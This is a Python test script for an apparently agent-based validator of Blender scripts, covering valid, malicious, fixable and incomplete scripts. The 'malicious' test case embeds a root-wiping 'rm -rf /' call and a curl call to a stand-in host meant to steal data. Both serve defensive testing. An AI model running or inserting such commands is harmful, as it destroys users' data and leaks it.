#!/usr/bin/env python3
"""Test script for ADK validation agent integration"""

import asyncio
import sys
import os

# Add the agent-adk directory to the path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from sub_agents.validation.tools.script_validator_tool import (
    validate_blender_script, 
    fix_common_script_issues
)

# Mock tool context for testing
class MockToolContext:
    def __init__(self):
        self.state = {}

async def test_validation():
    """Test the validation agent with various script scenarios."""
    
    print("🧪 Testing ADK Validation Agent Integration")
    print("=" * 50)
    
    # Test case 1: Valid script
    print("\n✅ Test 1: Valid Blender Script")
    valid_script = """import bpy
import sys
import math
from math import sin, cos, pi, radians

# Get output path from command line arguments
if "--" not in sys.argv:
    raise Exception("Please provide the output path after '--'")
output_path = sys.argv[sys.argv.index("--") + 1]

# Basic Setup
bpy.ops.object.select_all(action='SELECT')
bpy.ops.object.delete()

# Create camera
camera_data = bpy.data.cameras.new(name="Camera")
camera_object = bpy.data.objects.new("Camera", camera_data)
bpy.context.scene.collection.objects.link(camera_object)

# Create cube
bpy.ops.mesh.primitive_cube_add(size=2.0, location=(0, 0, 0))

# Export animation
bpy.ops.export_scene.gltf(
    filepath=output_path,
    export_format='GLB',
    export_animations=True
)"""
    
    context = MockToolContext()
    result = await validate_blender_script(context, valid_script)
    print(f"Status: {result['status']}")
    print(f"Valid: {result['valid']}")
    print(f"Summary: {result['summary']}")
    
    # Test case 2: Script with security issues
    print("\n❌ Test 2: Script with Security Issues")
    malicious_script = """import bpy
import subprocess
import os

# Dangerous code
subprocess.call(['rm', '-rf', '/'])
os.system('curl evil-site.com/steal-data')

bpy.ops.export_scene.gltf(filepath='output.glb', export_format='GLB')"""
    
    context = MockToolContext()
    result = await validate_blender_script(context, malicious_script)
    print(f"Status: {result['status']}")
    print(f"Valid: {result['valid']}")
    print(f"Summary: {result['summary']}")
    print(f"Security Issues: {len(result['details']['security_issues'])}")
    
    # Test case 3: Script with common issues that can be fixed
    print("\n🔧 Test 3: Script with Fixable Issues")
    problematic_script = """import bpy
import sys

# Get output path from command line arguments  
if "--" not in sys.argv:
    raise Exception("Please provide the output path after '--'")
output_path = sys.argv[sys.argv.index("--") + 1]

# Incorrect camera creation (too many arguments)
camera_data = bpy.data.cameras.new(name="Camera")
camera_object = bpy.data.objects.new("Camera", "Camera", camera_data)
bpy.context.scene.objects.link(camera_object)

# Incorrect rotation usage
cube = bpy.context.active_object
cube.rotation = (1, 2, 3)

bpy.ops.export_scene.gltf(filepath=output_path, export_format='GLB')"""
    
    context = MockToolContext()
    
    # First validate to see issues
    validation_result = await validate_blender_script(context, problematic_script)
    print(f"Before fixes - Valid: {validation_result['valid']}")
    print(f"Errors: {validation_result['error_count']}")
    
    # Then try to fix issues
    fix_result = await fix_common_script_issues(context, problematic_script)
    print(f"Fix status: {fix_result['status']}")
    print(f"Fixes applied: {fix_result['fix_count']}")
    print("Applied fixes:", fix_result['applied_fixes'])
    
    # Validate the fixed script
    fixed_script = fix_result['script']
    context_fixed = MockToolContext()
    final_validation = await validate_blender_script(context_fixed, fixed_script)
    print(f"After fixes - Valid: {final_validation['valid']}")
    
    # Test case 4: Script missing required components
    print("\n⚠️  Test 4: Script Missing Required Components")
    incomplete_script = """import bpy
print("Hello World")"""
    
    context = MockToolContext()
    result = await validate_blender_script(context, incomplete_script)
    print(f"Status: {result['status']}")
    print(f"Valid: {result['valid']}")
    print(f"Missing components: {len(result['details']['missing_components'])}")
    for component in result['details']['missing_components'][:3]:  # Show first 3
        print(f"  - {component}")
    
    print("\n🎉 Validation Testing Complete!")
    print("The validation agent successfully:")
    print("✅ Validates secure scripts")
    print("❌ Blocks malicious scripts") 
    print("🔧 Fixes common issues automatically")
    print("⚠️  Identifies missing components")

if __name__ == "__main__":
    asyncio.run(test_validation())